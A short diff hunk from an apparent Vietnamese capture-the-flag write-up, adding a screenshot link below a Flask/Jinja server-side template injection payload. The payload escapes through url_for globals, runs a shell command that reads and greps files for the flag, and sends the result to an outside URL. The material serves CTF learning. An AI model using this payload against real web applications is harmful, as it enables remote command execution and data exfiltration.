@@ -37,3 +37,4 @@
   url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('https://123/?flag=' + url_for.__globals__['os'].popen('cat * | grep \"ISIT\"').read())
   ```
 - Flag sẽ được in ra ở respone
+![Screenshot 2024-11-08 183042](https://github.com/user-attachments/assets/26375ac7-7317-40c6-9a8b-7517f9f0a9c6)
